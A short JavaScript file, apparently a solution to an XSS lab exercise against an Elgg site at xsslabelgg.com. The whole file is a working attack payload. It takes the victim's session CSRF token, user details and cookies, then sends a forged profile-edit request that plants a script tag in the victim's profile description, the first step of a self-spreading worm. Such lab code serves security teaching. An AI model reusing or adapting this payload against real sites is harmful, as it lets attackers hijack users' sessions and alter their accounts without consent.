'use strict';

const CONTENT = "__elgg_token="+escape(elgg.security.token.__elgg_token)+
                "&__elgg_ts="+escape(elgg.security.token.__elgg_ts)+
                "&name="+escape(elgg.session.user.name)+
                "&description="+escape("<script>alert('I am a worm!!');</script>")+
                "&guid="+escape(elgg.session.user.guid);

let Ajax = new XMLHttpRequest();
Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive", "300");
Ajax.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0");
Ajax.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
Ajax.setRequestHeader("Accept-Encoding", "gzip, deflate");
Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
Ajax.setRequestHeader("Referer", "http://www.xsslabelgg.com/profile/"+escape(elgg.session.user.username)+"/edit");
Ajax.setRequestHeader("Cookie", "Elgg="+escape(document.cookie));
Ajax.setRequestHeader("Connection", "keep-alive");
Ajax.setRequestHeader("Upgrade-Insecure-Requests", "1");
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

Ajax.setRequestHeader("Content-Length", CONTENT.length);
Ajax.send(CONTENT);